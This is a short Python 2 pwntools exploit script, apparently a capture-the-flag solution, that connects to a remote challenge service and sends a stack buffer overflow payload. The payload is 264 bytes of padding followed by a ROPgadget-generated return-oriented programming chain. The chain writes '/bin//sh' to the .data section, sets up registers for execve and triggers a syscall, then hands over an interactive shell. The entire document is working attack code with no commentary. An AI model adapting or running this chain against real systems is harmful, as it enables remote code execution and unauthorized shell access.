#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *

from struct import pack
r=remote('jh2i.com', 50002)
#r=process('./sad')
# Padding goes here
p = ''
p +='a'*264
p += pack('<Q', 0x0000000000407aae) # pop rsi ; ret
p += pack('<Q', 0x00000000004ae0e0) # @ .data
p += pack('<Q', 0x000000000043f8d7) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046b8a5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000407aae) # pop rsi ; ret
p += pack('<Q', 0x00000000004ae0e8) # @ .data + 8
p += pack('<Q', 0x000000000043a090) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046b8a5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040187a) # pop rdi ; ret
p += pack('<Q', 0x00000000004ae0e0) # @ .data
p += pack('<Q', 0x0000000000407aae) # pop rsi ; ret
p += pack('<Q', 0x00000000004ae0e8) # @ .data + 8
p += pack('<Q', 0x000000000040177f) # pop rdx ; ret
p += pack('<Q', 0x00000000004ae0e8) # @ .data + 8
p += pack('<Q', 0x000000000043a090) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004618b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040120f) # syscall


r.sendlineafter('This is a really big binary. Hope you have everything you need ;)', p)

r.interactive()